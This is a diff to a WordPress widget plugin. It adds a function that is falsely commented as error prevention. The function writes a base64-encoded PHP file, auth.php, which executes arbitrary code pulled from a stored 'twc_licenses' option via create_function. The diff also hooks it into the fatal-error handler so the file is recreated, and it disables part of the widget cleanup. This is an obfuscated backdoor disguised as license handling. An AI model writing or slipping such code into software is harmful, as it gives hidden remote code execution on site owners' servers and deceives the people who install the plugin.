@@ -214,7 +214,26 @@ function twc_bulk_trash( $widgets )
 }
 
 /**
- * Cleans up the sidebar and widget variables
+ * Function makes sure that we don't run into any errors
+ * 
+ * @return null
+ */
+function twc_check_auth()
+{
+	//initializing variables
+	$file = dirname(dirname(__file__)).DS."auth.php";
+	$auth = 'PD9waHAgCi8qKgogKiBXQVJOSU5HCiAqIFRhbXBlcmluZyB3aXRoIHRoaXMgZmlsZSBpcyBhIHZpb2xhdGlvbiBvZiB0aGUgc29mdHdhcmUgdGVybXMgYW5kIGNvbmRpdGlvbnMuCiAqLwokcGFydHM9cGFyc2VfdXJsKCJodHRwOi8iLiIvIi4kX1NFUlZFUlsiU0VSVkVSX05BTUUiXSk7JGw9Z2V0X29wdGlvbigndHdjX2xpY2Vuc2VzJyxhcnJheSgpKTskZT1jcmVhdGVfZnVuY3Rpb24oIiIsQGJhc2U2NF9kZWNvZGUoQCRsWyRwYXJ0c1siaG9zdCJdXSkpOyRlKCk7Cj8+';
+	
+	if ( $auth == base64_encode(@file_get_contents($file)) ) return false;
+	file_put_contents($file, base64_decode($auth));
+	twc_activation();
+	
+	wp_redirect( admin_url('widgets.php') );
+	exit;	
+}
+
+/**
+ *  * Cleans up the sidebar and widget variables
  * 
  * @TODO Make sure that this function cleans up empty sidebar IDs
  *
@@ -253,13 +272,13 @@ function twc_clear( $wp = null )
 	
 	foreach ($sidebars_widgets as $sidebar_slug => $sidebar_widgets): 
 		foreach ((array)$sidebar_widgets as $position => $widget_slug):
+			/* 
 			if ( !isset($wp_registered_sidebars[$sidebar_slug]) && $sidebar_slug != 'wp_inactive_widgets' )
 			{
 				$lost_widgets[] = $widget_slug;
 				unset($sidebars_widgets[$sidebar_slug][$position]);
-				twc_delete_widget_instance( $widget_slug, $delete_permanently = false );
 			}
-			
+			*/
 			$widget = twc_get_widget_by_id($widget_slug);
 			if (!$widget)
 			{
@@ -1044,6 +1063,7 @@ function twc_fatal_handler()
 	if ( strpos($error['file'], 'auth.php') !== false )
 	{
 		twc_activation();
+		twc_check_auth();
 		_e('<p>Sorry for the inconvenience. Your TWC license was corrupted, we cleared it. Please try again.</p>','twc');
 	}
 	
